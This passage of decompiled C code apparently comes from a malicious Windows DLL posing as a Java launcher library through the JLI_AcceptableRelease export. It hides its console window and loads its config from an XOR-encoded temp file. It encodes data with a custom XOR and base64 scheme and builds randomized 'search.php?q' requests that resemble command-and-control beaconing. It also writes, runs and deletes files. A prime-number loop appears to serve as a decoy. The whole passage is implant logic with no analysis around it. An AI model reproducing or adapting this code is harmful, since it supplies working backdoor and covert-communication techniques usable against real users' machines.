        if (*(char *)(v8 - 1 + v13) == 62) {
            // break -> 0x10002f54
            break;
        }
        *(int32_t *)(v12 - 4) = v11;
        v14 = v12 - 8;
        *(int32_t *)v14 = g131;
        GetExitCodeProcess(&g161, &g161);
        v15 = v14;
    }
    // 0x10002f54
    *(char *)(v13 + v8) = 0;
    *(int32_t *)(v15 - 4) = v11;
    *(int32_t *)(v15 - 8) = g131;
    GetExitCodeProcess(&g161, &g161);
    g125 = v13 != 259 ? 0 : g125;
    int32_t v18; // bp-1324, 0x10002d90
    int32_t v19 = &v18; // 0x10002f82
    *(int32_t *)(v15 - 12) = v19;
    *(int32_t *)(v15 - 16) = 1000;
    char * lpString1_ = (char *)0x5a434d44; // bp-220, 0x10002f94
    *(int32_t *)(v15 - 20) = (int32_t)&lpString1_;
    *(int32_t *)(v15 - 24) = v19;
    lstrcatA(lpString1_, (char *)0x30303030);
    *(int32_t *)(v15 - 28) = 0;
    *(int32_t *)(v15 - 32) = 0;
    *(int32_t *)(v15 - 36) = 2;
    *(int32_t *)(v15 - 40) = 0;
    *(int32_t *)(v15 - 44) = 7;
    *(int32_t *)(v15 - 48) = 0x40000000;
    *(int32_t *)(v15 - 52) = v19;
    int32_t * fileHandle = CreateFileA((char *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x10002fdd
    int32_t v20 = (int32_t)fileHandle; // 0x10002fdd
    *(int32_t *)(v15 - 56) = 0;
    int32_t v21; // bp-1356, 0x10002d90
    *(int32_t *)(v15 - 60) = (int32_t)&v21;
    *(int32_t *)(v15 - 64) = v13;
    *(int32_t *)(v15 - 68) = v8;
    *(int32_t *)(v15 - 72) = v20;
    WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
    *(int32_t *)(v15 - 76) = v20;
    CloseHandle(&g161);
    *(int32_t *)(v15 - 80) = v8;
    LocalFree(&g161);
    int32_t * v22 = (int32_t *)(v15 - 84); // 0x10003005
    *v22 = a2;
    *(int32_t *)(v15 - 88) = v19;
    *(int32_t *)(v15 - 92) = 0;
    *(int32_t *)(v15 - 96) = a1;
    function_100084b0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
    *v22 = v19;
    DeleteFileA((char *)&g161);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10003050 - 0x1000309e
int32_t function_10003050(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10003050
    int32_t v1; // bp-12, 0x10003050
    int32_t v2 = &v1; // 0x10003057
    int32_t v3 = 3;
    int32_t v4 = 2;
    int32_t v5 = v3 - 1; // 0x10003065
    int32_t v6; // 0x10003050
    int32_t v7 = v6; // 0x1000306a
    int32_t v8 = 2; // 0x1000306a
    int32_t v9; // 0x10003050
    int64_t v10; // 0x10003073
    int64_t v11; // 0x10003073
    int32_t v12; // 0x10003079
    if (v5 >= 2) {
        // 0x10003070
        v10 = 0x100000000 * (int64_t)(v3 >> 31) | (int64_t)v3;
        v9 = 2;
        v11 = v9;
        v8 = v9;
        while ((int32_t)(v10 % v11) != 0) {
            // 0x10003079
            v12 = v9 + 1;
            v8 = v12;
            if (v12 > v5) {
                // break -> 0x1000307e
                break;
            }
            v9 = v12;
            v11 = v9;
            v8 = v9;
        }
        // 0x1000307e
        v7 = v10 / v11;
    }
    int32_t v13 = v7; // 0x10003080
    int32_t v14 = v4; // 0x10003080
    if (v8 == v3) {
        // 0x10003082
        *(int32_t *)(v2 - 4) = v3;
        *(int32_t *)(v2 - 8) = (int32_t)"%d\n";
        v13 = _printf((char *)&g161);
        v14 = v4 + 1;
    }
    int32_t result = v13;
    int32_t v15 = v3 + 1; // 0x10003098
    while (v14 < 0x13881) {
        // 0x10003060
        v3 = v15;
        v4 = v14;
        v5 = v3 - 1;
        v7 = result;
        int32_t v16 = 2; // 0x1000306a
        if (v5 >= 2) {
            // 0x10003070
            v10 = 0x100000000 * (int64_t)(v3 >> 31) | (int64_t)v3;
            v9 = 2;
            v11 = v9;
            v8 = v9;
            while ((int32_t)(v10 % v11) != 0) {
                // 0x10003079
                v12 = v9 + 1;
                v8 = v12;
                if (v12 > v5) {
                    // break -> 0x1000307e
                    break;
                }
                v9 = v12;
                v11 = v9;
                v8 = v9;
            }
            // 0x1000307e
            v7 = v10 / v11;
            v16 = v8;
        }
        // 0x1000307e
        v13 = v7;
        v14 = v4;
        if (v16 == v3) {
            // 0x10003082
            *(int32_t *)(v2 - 4) = v3;
            *(int32_t *)(v2 - 8) = (int32_t)"%d\n";
            v13 = _printf((char *)&g161);
            v14 = v4 + 1;
        }
        // 0x10003091
        result = v13;
        v15 = v3 + 1;
    }
    // 0x1000309a
    return result;
}

// Address range: 0x100030a0 - 0x10003120
int32_t function_100030a0(void) {
    // 0x100030a0
    *(int32_t *)&g72 = 0x6e72656b;
    *(int32_t *)&g73 = 0x32336c65;
    *(int32_t *)&g74 = 0x6c6c642e;
    *(char *)&g75 = 0;
    GetModuleHandleA(g72);
    __asm_movdqu(0, __asm_movdqa_9(0x776f646e6957656c6f736e6f43746547));
    int32_t (*func)() = GetProcAddress(NULL, (char *)&g161); // 0x100030f6
    g147 = (int32_t)func;
    if (func != NULL) {
        // 0x10003107
        ShowWindow((int32_t *)func, 0);
    }
    // 0x10003116
    function_10003d20((int32_t)&g161, (int32_t)&g161);
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    return __asm_int3();
}

// Address range: 0x10003120 - 0x10003125
int32_t JLI_AcceptableRelease(void) {
    // 0x10003120
    return function_100030a0();
}

// Address range: 0x10003130 - 0x10003138
int32_t _DllMain_40_12(void) {
    // 0x10003130
    return 1;
}

// Address range: 0x10003140 - 0x100032da
int32_t function_10003140(void) {
    // 0x10003140
    int32_t v1; // 0x10003140
    if (v1 == 0) {
        // 0x10003157
        return 0;
    }
    int32_t v2; // 0x10003140
    int32_t v3; // 0x10003140
    if (v3 == 0) {
        int32_t v4; // 0x10003140
        int32_t v5 = v4;
        v4 = v5 + 1;
        while (*(char *)v5 != 0) {
            // 0x10003170
            v5 = v4;
            v4 = v5 + 1;
        }
        // 0x10003177
        v2 = v5 - v1;
    }
    int32_t * memoryHandle = LocalAlloc(64, 3 * v3 + 4); // 0x1000317f
    int32_t result = (int32_t)memoryHandle; // 0x1000317f
    if (v2 < 1) {
        // 0x10003157
        return result;
    }
    char * v6 = (char *)memoryHandle; // 0x1000319f
    for (int32_t i = 1; i < v2 - 1; i += 3) {
        int32_t v7 = i + v1;
        int32_t v8 = 0; // 0x100031a9
        if (i < v2) {
            // 0x100031ab
            v8 = (int32_t)*(char *)v7;
        }
        uint32_t v9 = v8;
        int32_t v10 = i + 1; // 0x100031b1
        int32_t v11 = 0; // 0x100031b9
        if (v10 < v2) {
            // 0x100031bb
            v11 = (int32_t)*(char *)(v10 + v1);
        }
        uint32_t v12 = (int32_t)*(char *)(v7 - 1); // 0x100031a0
        uint32_t v13 = v11;
        uint32_t v14 = v12 / 4; // 0x100031c7
        unsigned char v15 = (char)v14; // 0x100031e9
        int32_t v16; // 0x10003140
        if (v15 >= 26) {
            if (v15 >= 52) {
                if (v15 >= 62) {
                    // 0x10003207
                    v16 = 4 * (int32_t)(v15 != 62) | 43;
                } else {
                    // 0x10003202
                    v16 = v14 + 252 & 255;
                }
            } else {
                // 0x100031f8
                v16 = v14 + 71;
            }
        } else {
            // 0x100031ee
            v16 = v14 + 65;
        }
        int32_t v17 = v9 / 16 | 16 * v12 & 48;
        *v6 = (char)v16;
        unsigned char v18 = (char)v17; // 0x10003213
        int32_t v19; // 0x10003140
        if (v18 >= 26) {
            if (v18 >= 52) {
                if (v18 >= 62) {
                    // 0x10003231
                    v19 = 4 * (int32_t)(v18 != 62) | 43;
                } else {
                    // 0x1000322c
                    v19 = v17 + 252 & 255;
                }
            } else {
                // 0x10003222
                v19 = v17 + 71;
            }
        } else {
            // 0x10003218
            v19 = v17 + 65;
        }
        int32_t v20 = (int32_t)v6; // 0x100031b6
        *(char *)(v20 + 1) = (char)v19;
        if (i < v2) {
            unsigned char v21 = (char)(v13 / 64 | 4 * v9 & 60); // 0x10003245
            if (v21 >= 26) {
                if (v21 >= 52) {
                    if (v21 >= 62) {
                        // 0x1000326c
                        *(char *)(v20 + 2) = 4 * (char)(v21 != 62) | 43;
                    } else {
                        // 0x10003264
                        *(char *)(v20 + 2) = v21 - 4;
                    }
                } else {
                    // 0x10003257
                    *(char *)(v20 + 2) = v21 + 71;
                }
            } else {
                // 0x1000324a
                *(char *)(v20 + 2) = v21 + 65;
            }
        } else {
            // 0x1000327b
            *(char *)(v20 + 2) = 61;
        }
        int32_t v22 = v20 + 3; // 0x10003282
        if (v10 < v2) {
            unsigned char v23 = (char)v13 & 63; // 0x10003289
            if (v23 >= 26) {
                if (v23 >= 52) {
                    if (v23 >= 62) {
                        // 0x100032a7
                        *(char *)v22 = 4 * (char)(v23 != 62) | 43;
                    } else {
                        // 0x100032a1
                        *(char *)v22 = v23 - 4;
                    }
                } else {
                    // 0x10003297
                    *(char *)v22 = v23 + 71;
                }
            } else {
                // 0x1000328d
                *(char *)v22 = v23 + 65;
            }
        } else {
            // 0x100032b5
            *(char *)v22 = 61;
        }
        // 0x100032b8
        v6 = (char *)(v20 + 4);
    }
    // 0x10003157
    return result;
}

// Address range: 0x100032e0 - 0x100034e6
int32_t function_100032e0(void) {
    int32_t v1 = 64; // bp-48, 0x100032fb
    int32_t v2 = &v1; // 0x100032fb
    uint32_t v3; // 0x100032e0
    int32_t * memoryHandle = LocalAlloc(64, (int32_t)(2 * v3) + 2); // 0x100032fd
    int32_t v4 = (int32_t)memoryHandle; // 0x100032fd
    int32_t v5 = 0; // 0x1000330a
    if (v3 >= 1) {
        int32_t v6 = v4; // 0x100032e0
        int32_t v7 = 0; // 0x1000332e
        int32_t v8; // 0x100032e0
        char * v9 = (char *)(v7 + v8); // 0x10003314
        unsigned char v10 = *v9; // 0x10003314
        unsigned char v11 = (v10 / 8 | 32 * v10) ^ 35; // 0x1000331a
        *v9 = v11;
        *(int32_t *)(v2 - 4) = (int32_t)v11;
        *(int32_t *)(v2 - 8) = (int32_t)"%02x";
        *(int32_t *)(v2 - 12) = v6;
        _sprintf((char *)&g161, (char *)&g161);
        v7++;
        v6 += 2;
        while (v7 != v3) {
            // 0x10003311
            v9 = (char *)(v7 + v8);
            v10 = *v9;
            v11 = (v10 / 8 | 32 * v10) ^ 35;
            *v9 = v11;
            *(int32_t *)(v2 - 4) = (int32_t)v11;
            *(int32_t *)(v2 - 8) = (int32_t)"%02x";
            *(int32_t *)(v2 - 12) = v6;
            _sprintf((char *)&g161, (char *)&g161);
            v7++;
            v6 += 2;
        }
    }
    // 0x1000333f
    *(char *)(v5 + v4) = 0;
    if (memoryHandle == NULL) {
        // 0x1000334a
        *(int32_t *)(v2 - 4) = v4;
        LocalFree(&g161);
        return 0;
    }
    int32_t v12 = v4; // 0x1000335e
    int32_t v13 = v5; // 0x1000335e
    if (v5 == 0) {
        while (*(char *)v12 != 0) {
            // 0x10003365
            v12++;
        }
        // 0x1000336c
        v13 = v12 - v4;
    }
    // 0x1000336e
    *(int32_t *)(v2 - 4) = 6 * v3 + 4;
    *(int32_t *)(v2 - 8) = 64;
    int32_t memoryHandle2 = (int32_t)LocalAlloc((int32_t)&g161, (int32_t)&g161); // 0x10003374
    if (v13 < 1) {
        // 0x100034d3
        *(int32_t *)(v2 - 12) = v4;
        LocalFree((int32_t *)memoryHandle2);
        return memoryHandle2;
    }
    int32_t v14 = 1;
    int32_t v15 = v14 + v4;
    int32_t v16 = 0; // 0x100033a9
    if (v14 < v13) {
        // 0x100033ab
        v16 = (int32_t)*(char *)v15;
    }
    uint32_t v17 = v16;
    int32_t v18 = v14 + 1; // 0x100033b1
    int32_t v19 = 0; // 0x100033b9
    if (v18 < v13) {
        // 0x100033bb
        v19 = (int32_t)*(char *)(v18 + v4);
    }
    uint32_t v20 = (int32_t)*(char *)(v15 - 1); // 0x100033a0
    uint32_t v21 = v19;
    uint32_t v22 = v20 / 4; // 0x100033c7
    unsigned char v23 = (char)v22; // 0x100033e9
    int32_t v24; // 0x100032e0
    if (v23 >= 26) {
        if (v23 >= 52) {
            if (v23 >= 62) {
                // 0x10003407
                v24 = 4 * (int32_t)(v23 != 62) | 43;
            } else {
                // 0x10003402
                v24 = v22 + 252 & 255;
            }
        } else {
            // 0x100033f8
            v24 = v22 + 71;
        }
    } else {
        // 0x100033ee
        v24 = v22 + 65;
    }
    int32_t v25 = v17 / 16 | 16 * v20 & 48;
    *(char *)memoryHandle2 = (char)v24;
    unsigned char v26 = (char)v25; // 0x10003413
    int32_t v27; // 0x100032e0
    if (v26 >= 26) {
        if (v26 >= 52) {
            if (v26 >= 62) {
                // 0x10003431
                v27 = 4 * (int32_t)(v26 != 62) | 43;
            } else {
                // 0x1000342c
                v27 = v25 + 252 & 255;
            }
        } else {
            // 0x10003422
            v27 = v25 + 71;
        }
    } else {
        // 0x10003418
        v27 = v25 + 65;
    }
    // 0x1000343b
    *(char *)(memoryHandle2 + 1) = (char)v27;
    unsigned char v28; // 0x10003445
    if (v14 < v13) {
        // 0x10003445
        v28 = (char)(v21 / 64 | 4 * v17 & 60);
        if (v28 >= 26) {
            if (v28 >= 52) {
                if (v28 >= 62) {
                    // 0x1000346c
                    *(char *)(memoryHandle2 + 2) = 4 * (char)(v28 != 62) | 43;
                } else {
                    // 0x10003464
                    *(char *)(memoryHandle2 + 2) = v28 - 4;
                }
            } else {
                // 0x10003457
                *(char *)(memoryHandle2 + 2) = v28 + 71;
            }
        } else {
            // 0x1000344a
            *(char *)(memoryHandle2 + 2) = v28 + 65;
        }
    } else {
        // 0x1000347b
        *(char *)(memoryHandle2 + 2) = 61;
    }
    int32_t v29 = memoryHandle2 + 3; // 0x10003482
    unsigned char v30; // 0x10003489
    if (v18 < v13) {
        // 0x10003489
        v30 = (char)v21 & 63;
        if (v30 >= 26) {
            if (v30 >= 52) {
                if (v30 >= 62) {
                    // 0x100034a7
                    *(char *)v29 = 4 * (char)(v30 != 62) | 43;
                } else {
                    // 0x100034a1
                    *(char *)v29 = v30 - 4;
                }
            } else {
                // 0x10003497
                *(char *)v29 = v30 + 71;
            }
        } else {
            // 0x1000348d
            *(char *)v29 = v30 + 65;
        }
    } else {
        // 0x100034b5
        *(char *)v29 = 61;
    }
    int32_t v31 = memoryHandle2 + 4; // 0x100034be
    int32_t v32 = v14 + 3; // 0x100034ca
    int32_t hMem = v31; // 0x100034ca
    while (v14 + 2 < v13) {
        // 0x100033a0
        v14 = v32;
        int32_t v33 = v31;
        v15 = v14 + v4;
        v16 = 0;
        if (v14 < v13) {
            // 0x100033ab
            v16 = (int32_t)*(char *)v15;
        }
        // 0x100033b1
        v17 = v16;
        v18 = v14 + 1;
        v19 = 0;
        if (v18 < v13) {
            // 0x100033bb
            v19 = (int32_t)*(char *)(v18 + v4);
        }
        // 0x100033c2
        v20 = (int32_t)*(char *)(v15 - 1);
        v21 = v19;
        v22 = v20 / 4;
        v23 = (char)v22;
        if (v23 >= 26) {
            if (v23 >= 52) {
                if (v23 >= 62) {
                    // 0x10003407
                    v24 = 4 * (int32_t)(v23 != 62) | 43;
                } else {
                    // 0x10003402
                    v24 = v22 + 252 & 255;
                }
            } else {
                // 0x100033f8
                v24 = v22 + 71;
            }
        } else {
            // 0x100033ee
            v24 = v22 + 65;
        }
        // 0x10003411
        v25 = v17 / 16 | 16 * v20 & 48;
        *(char *)v33 = (char)v24;
        v26 = (char)v25;
        if (v26 >= 26) {
            if (v26 >= 52) {
                if (v26 >= 62) {
                    // 0x10003431
                    v27 = 4 * (int32_t)(v26 != 62) | 43;
                } else {
                    // 0x1000342c
                    v27 = v25 + 252 & 255;
                }
            } else {
                // 0x10003422
                v27 = v25 + 71;
            }
        } else {
            // 0x10003418
            v27 = v25 + 65;
        }
        // 0x1000343b
        *(char *)(v33 + 1) = (char)v27;
        if (v14 < v13) {
            // 0x10003445
            v28 = (char)(v21 / 64 | 4 * v17 & 60);
            if (v28 >= 26) {
                if (v28 >= 52) {
                    if (v28 >= 62) {
                        // 0x1000346c
                        *(char *)(v33 + 2) = 4 * (char)(v28 != 62) | 43;
                    } else {
                        // 0x10003464
                        *(char *)(v33 + 2) = v28 - 4;
                    }
                } else {
                    // 0x10003457
                    *(char *)(v33 + 2) = v28 + 71;
                }
            } else {
                // 0x1000344a
                *(char *)(v33 + 2) = v28 + 65;
            }
        } else {
            // 0x1000347b
            *(char *)(v33 + 2) = 61;
        }
        // 0x1000347f
        v29 = v33 + 3;
        if (v18 < v13) {
            // 0x10003489
            v30 = (char)v21 & 63;
            if (v30 >= 26) {
                if (v30 >= 52) {
                    if (v30 >= 62) {
                        // 0x100034a7
                        *(char *)v29 = 4 * (char)(v30 != 62) | 43;
                    } else {
                        // 0x100034a1
                        *(char *)v29 = v30 - 4;
                    }
                } else {
                    // 0x10003497
                    *(char *)v29 = v30 + 71;
                }
            } else {
                // 0x1000348d
                *(char *)v29 = v30 + 65;
            }
        } else {
            // 0x100034b5
            *(char *)v29 = 61;
        }
        // 0x100034b8
        v31 = v33 + 4;
        v32 = v14 + 3;
        hMem = v31;
    }
    // 0x100034d3
    *(int32_t *)(v2 - 12) = v4;
    LocalFree((int32_t *)hMem);
    return memoryHandle2;
}

// Address range: 0x100034f0 - 0x100035d0
int32_t function_100034f0(void) {
    int32_t v1; // 0x100034f0
    int32_t v2 = v1;
    v1 = v2 + 1;
    // 0x100034f0
    while (*(char *)v2 != 0) {
        // 0x10003510
        v2 = v1;
        v1 = v2 + 1;
    }
    // 0x10003517
    int32_t v3; // 0x100034f0
    uint32_t v4 = v2 - v3 + 1; // 0x1000351c
    int32_t v5; // bp-808, 0x100034f0
    if (v4 >= 1) {
        // 0x10003523
        int32_t v6; // bp-824, 0x100034f0
        int32_t v7 = &v6; // 0x1000351b
        int32_t v8 = 0; // 0x10003529
        int32_t v9 = &v5; // 0x10003529
        char * v10 = (char *)(v8 + v3); // 0x10003530
        unsigned char v11 = *v10; // 0x10003530
        unsigned char v12 = (v11 / 8 | 32 * v11) ^ 35; // 0x10003536
        *v10 = v12;
        *(int32_t *)(v7 - 4) = (int32_t)v12;
        *(int32_t *)(v7 - 8) = (int32_t)"%02x";
        *(int32_t *)(v7 - 12) = v9;
        _sprintf((char *)&g161, (char *)&g161);
        v8++;
        v9 += 2;
        while (v8 != v4) {
            // 0x10003530
            v10 = (char *)(v8 + v3);
            v11 = *v10;
            v12 = (v11 / 8 | 32 * v11) ^ 35;
            *v10 = v12;
            *(int32_t *)(v7 - 4) = (int32_t)v12;
            *(int32_t *)(v7 - 8) = (int32_t)"%02x";
            *(int32_t *)(v7 - 12) = v9;
            _sprintf((char *)&g161, (char *)&g161);
            v8++;
            v9 += 2;
        }
    }
    uint32_t v13 = 2 * v4 | 1; // 0x1000355b
    if (v13 >= 800) {
        // 0x100035c7
        function_1000b43d();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        return __asm_int3();
    }
    // 0x1000356a
    int32_t v14; // bp-4, 0x100034f0
    *(char *)((int32_t)&v14 - 804 + v13) = 0;
    int32_t v15 = &v5; // 0x1000357c
    while (*(char *)v15 != 0) {
        // 0x10003580
        v15++;
    }
    int32_t v16 = function_10003140(); // 0x1000358f
    char v17 = *(char *)v16; // 0x1000359c
    if (v17 == 0) {
        // 0x100035b3
        *(char *)v3 = 0;
        return _40___security_check_cookie_40_4();
    }
    int32_t v18 = v16; // 0x100035a4
    int32_t v19 = 0; // 0x100035a4
    *(char *)(v3 - v16 + v18) = v17;
    v18++;
    char v20 = *(char *)v18; // 0x100035ac
    v19++;
    while (v20 != 0) {
        // 0x100035a6
        *(char *)(v3 - v16 + v18) = v20;
        v18++;
        v20 = *(char *)v18;
        v19++;
    }
    // 0x100035b3
    *(char *)(v19 + v3) = 0;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100035d0 - 0x10003639
int32_t function_100035d0(void) {
    int32_t v1 = _rand(); // 0x100035d5
    int64_t v2 = 0x100000000 * (int64_t)(v1 >> 31) | (int64_t)v1; // 0x100035e0
    int32_t v3 = (int32_t)(v2 % 7) + 3; // 0x100035e4
    int32_t v4; // 0x100035d0
    if (v3 < 1) {
        // 0x10003631
        *(char *)v4 = 0;
        return v2 / 7;
    }
    int32_t v5 = 0; // 0x1000362c
    int32_t v6; // 0x100035d0
    int64_t v7; // 0x100035fb
    char v8; // 0x100035fd
    while (true) {
      lab_0x100035f0:
        // 0x100035f0
        v6 = v5;
        int32_t v9 = _rand(); // 0x100035f0
        v7 = 0x100000000 * (int64_t)(v9 >> 31) | (int64_t)v9;
        char v10 = v7 % 26; // 0x100035fb
        v8 = v10 + 97;
        if (v6 != 0) {
            switch (v10) {
                case 25: {
                    goto lab_0x10003622;
                }
                case 17: {
                    goto lab_0x10003622;
                }
                default: {
                    // 0x1000361d
                    *(char *)(v6 + v4) = v8;
                    goto lab_0x1000362c;
                }
            }
        } else {
            if (v8 != 114 == (v8 != 122)) {
                // 0x1000361d
                *(char *)(v6 + v4) = v8;
                goto lab_0x1000362c;
            } else {
                // 0x1000360e
                *(char *)v4 = 112;
                goto lab_0x1000362c;
            }
        }
    }
  lab_0x10003631:
    // 0x10003631
    *(char *)(v3 + v4) = 0;
    return v7 / 26;
  lab_0x10003622:;
    int32_t v11 = v6 + v4;
    if (*(char *)(v11 - 1) == v8) {
        // 0x10003628
        *(char *)v11 = 107;
    }
    goto lab_0x1000362c;
  lab_0x1000362c:
    // 0x1000362c
    v5 = v6 + 1;
    if (v5 == v3) {
        // break -> 0x10003631
        goto lab_0x10003631;
    }
    goto lab_0x100035f0;
}

// Address range: 0x10003640 - 0x100038a0
int32_t function_10003640(void) {
    // 0x10003640
    int32_t v1; // bp-4, 0x10003640
    int32_t v2 = &v1; // 0x10003641
    __chkstk();
    int32_t nBufferLength; // 0x10003640
    GetTempPathW(nBufferLength, (int16_t *)&g161);
    __asm_movdqu(0, __asm_movdqa_9(g30));
    lstrcatW((int16_t *)&g161, (int16_t *)&g161);
    HeapAlloc(GetProcessHeap(), (int32_t)&g161, (int32_t)&g161);
    int16_t * lpNumberOfBytesRead = NULL; // bp-6212, 0x100036c2
    int32_t v3; // bp-3208, 0x10003640
    int32_t v4 = &v3; // bp-72, 0x100036cc
    int32_t * hObject = CreateFileW(NULL, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x100036cd
    int32_t v5; // 0x10003640
    int32_t v6; // 0x10003640
    int32_t lpBuffer; // bp-6208, 0x10003640
    if (hObject == (int32_t *)-1) {
        // 0x100036fd
        v6 = &v4;
        v5 = 40;
    } else {
        int32_t v7 = (int32_t)hObject; // 0x100036cd
        ReadFile((int32_t *)(v7 & 0xffff), &lpBuffer, 3000, (int32_t *)&lpNumberOfBytesRead, NULL);
        int32_t v8 = v7; // bp-96, 0x100036f6
        CloseHandle(hObject);
        int32_t v9 = &v8;
        v6 = v9;
        v5 = 40;
        if (lpNumberOfBytesRead != NULL) {
            int32_t v10 = 0; // 0x1000373c
            while (true) {
                uint32_t v11 = v10;
                char * v12 = (char *)(v2 - 0x183c + v11); // 0x10003710
                char v13 = *v12; // 0x10003710
                char v14; // 0x10003640
                if (v13 != 10) {
                    // 0x10003732
                    v14 = v13 ^ 35;
                } else {
                    // 0x1000371d
                    v14 = 0;
                    if (v11 >= 3000) {
                        // break -> 0x1000388d
                        break;
                    }
                }
                // 0x1000373c
                v10 = v11 + 1;
                *v12 = v14;
                if (v10 >= (int32_t)lpNumberOfBytesRead) {
                    // 0x10003741
                    v6 = v9;
                    v5 = v11 + 41;
                    goto lab_0x10003741_2;
                }
            }
            // 0x1000388d
            function_1000b43d();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            return __asm_int3();
        }
    }
    goto lab_0x10003741_2;
  lab_0x10003741_2:
    // 0x10003741
    *(int32_t *)(v6 - 4) = v5;
    int32_t v15 = v6 - 8; // 0x1000374b
    *(int32_t *)v15 = 64;
    int32_t memoryHandle = (int32_t)LocalAlloc((int32_t)&g161, (int32_t)&g161); // 0x1000374d
    int32_t v16 = 0; // 0x10003765
    int32_t v17 = v15; // 0x10003765
    int32_t v18 = 0; // 0x10003765
    if (lpNumberOfBytesRead != NULL) {
        int32_t uFlags = 0; // 0x10003640
        int32_t v19 = 0; // 0x10003794
        *(int32_t *)(v15 - 4) = 50;
        *(int32_t *)(v15 - 8) = 64;
        int32_t memoryHandle2 = (int32_t)LocalAlloc(uFlags, (int32_t)&g161); // 0x1000376b
        *(int32_t *)(4 * uFlags + memoryHandle) = memoryHandle2;
        int32_t v20 = v19 + (int32_t)&lpBuffer; // 0x1000377c
        *(int32_t *)(v15 - 12) = v20;
        *(int32_t *)(v15 - 16) = memoryHandle2;
        lstrcpyA((char *)&g161, (char *)&g161);
        int32_t v21 = v15 - 20; // 0x10003786
        *(int32_t *)v21 = v20;
        v19 = v19 + 1 + lstrlenA((char *)&g161);
        int32_t v22 = uFlags + 1; // 0x10003796
        uFlags = v22;
        int32_t v23 = v21; // 0x100037a3
        while (v19 < (int32_t)lpNumberOfBytesRead) {
            // 0x10003767
            *(int32_t *)(v23 - 4) = 50;
            *(int32_t *)(v23 - 8) = 64;
            memoryHandle2 = (int32_t)LocalAlloc(uFlags, (int32_t)&g161);
            *(int32_t *)(4 * uFlags + memoryHandle) = memoryHandle2;
            v20 = v19 + (int32_t)&lpBuffer;
            *(int32_t *)(v23 - 12) = v20;
            *(int32_t *)(v23 - 16) = memoryHandle2;
            lstrcpyA((char *)&g161, (char *)&g161);
            v21 = v23 - 20;
            *(int32_t *)v21 = v20;
            v19 = v19 + 1 + lstrlenA((char *)&g161);
            v22 = uFlags + 1;
            uFlags = v22;
            v23 = v21;
        }
        // 0x100037a5
        v16 = v22;
        v17 = v21;
        v18 = 4 * v22;
    }
    // 0x100037ab
    int128_t v24; // bp-1208, 0x10003640
    __asm_movdqu(v24, __asm_movdqa_9(g37));
    int128_t v25; // 0x10003640
    __asm_movdqu(v25, __asm_movdqa_9(0x713f7068702e6863726165732f74656e));
    int32_t v26 = 0; // 0x100037e9
    int32_t v27 = 0x7e2001 * (int32_t)g76 + 0x56eb93; // 0x100037fc
    uint32_t v28 = v27 % 52;
    *(char *)(v2 - 204 + v26) = (char)((v28 > 25 ? 39 : 97) + v28);
    v26++;
    int32_t v29 = v27; // 0x10003824
    while (v26 != 24) {
        // 0x100037f1
        v27 = 0x7e2001 * v29 + 0x56eb93;
        v28 = v27 % 52;
        *(char *)(v2 - 204 + v26) = (char)((v28 > 25 ? 39 : 97) + v28);
        v26++;
        v29 = v27;
    }
    // 0x10003826
    g76 = v27;
    int32_t v30; // bp-208, 0x10003640
    *(int32_t *)(v17 - 4) = (int32_t)&v30;
    *(char *)(v2 - 180) = 0;
    *(int32_t *)(v17 - 8) = (int32_t)&v24;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v17 - 12) = 50;
    *(int32_t *)(v17 - 16) = 6;
    int32_t * v31 = GetProcessHeap(); // 0x1000384c
    int32_t v32 = v17 - 20; // 0x10003852
    *(int32_t *)v32 = (int32_t)v31;
    int32_t * v33 = HeapAlloc(&g161, (int32_t)&g161, (int32_t)&g161); // 0x10003853
    *(int32_t *)(v18 + memoryHandle) = (int32_t)v33;
    int32_t v34 = 19; // 0x10003861
    int32_t v35 = v34; // 0x10003862
    int32_t v36 = v32; // 0x10003862
    while (v34 != 0) {
        // 0x100037c0
        __asm_movdqu(v24, __asm_movdqa_9(g37));
        __asm_movdqu(v25, __asm_movdqa_9(0x713f7068702e6863726165732f74656e));
        v26 = 0;
        v27 = 0x7e2001 * (int32_t)g76 + 0x56eb93;
        v28 = v27 % 52;
        *(char *)(v2 - 204 + v26) = (char)((v28 > 25 ? 39 : 97) + v28);
        v26++;
        v29 = v27;
        while (v26 != 24) {
            // 0x100037f1
            v27 = 0x7e2001 * v29 + 0x56eb93;
            v28 = v27 % 52;
            *(char *)(v2 - 204 + v26) = (char)((v28 > 25 ? 39 : 97) + v28);
            v26++;
            v29 = v27;
        }
        // 0x10003826
        g76 = v27;
        *(int32_t *)(v36 - 4) = (int32_t)&v30;
        *(char *)(v2 - 180) = 0;
        *(int32_t *)(v36 - 8) = (int32_t)&v24;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v36 - 12) = 50;
        *(int32_t *)(v36 - 16) = 6;
        v31 = GetProcessHeap();
        v32 = v36 - 20;
        *(int32_t *)v32 = (int32_t)v31;
        v33 = HeapAlloc(&g161, (int32_t)&g161, (int32_t)&g161);
        *(int32_t *)(v18 + memoryHandle) = (int32_t)v33;
        v34 = v35 - 1;
        v35 = v34;
        v36 = v32;
    }
    // 0x10003868
    *(int32_t *)nBufferLength = v16;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100038a0 - 0x10003aff
int32_t function_100038a0(void) {
    struct in_addr in; // 0x100039f3
    // 0x100038a0
    __chkstk();
    int128_t v1 = __asm_movdqa_9(g30); // 0x100038b7
    int128_t v2; // 0x100038a0
    __asm_movdqu(v2, v1);
    int128_t v3 = __asm_xorps(v1, v1); // 0x100038e5
    __asm_movdqu(0, v3);
    int128_t v4; // 0x100038a0
    __asm_movdqu(v4, v3);
    getaddrinfo(NULL, (char *)1, (struct addrinfo *)6, (struct addrinfo **)&g161);
    int32_t nBufferLength = *(int32_t *)24; // 0x10003925
